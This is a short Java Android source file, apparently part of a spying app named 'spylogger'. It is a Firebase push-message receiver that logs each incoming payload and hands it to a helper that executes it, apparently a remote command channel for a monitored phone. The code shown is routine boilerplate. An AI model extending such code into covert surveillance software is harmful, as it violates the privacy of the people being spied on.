package com.gravatasufoca.spylogger.services.fcm;

import android.util.Log;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.gravatasufoca.spylogger.services.FcmHelperService;
import com.gravatasufoca.spylogger.vos.FcmMessageVO;

public class MessageReceived extends FirebaseMessagingService {
    private static final String TAG = "RECEIVED MESSAGE";

    public MessageReceived() {
    }

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        // TODO(developer): Handle FCM messages here.
        // If the application is in the foreground handle both data and notification messages here.
        // Also if you intend on generating your own notifications as a result of a received FCM
        // message, here is where that should be initiated. See sendNotification method below.
        Log.d(TAG, "From: " + remoteMessage.getFrom());
        Log.d(TAG, "Notification Message Body: " + remoteMessage.getData());

        FcmHelperService fcmHelperService=new FcmHelperService(getApplicationContext(),FcmMessageVO.converter(remoteMessage.getData()));
        fcmHelperService.executar();
    }

}
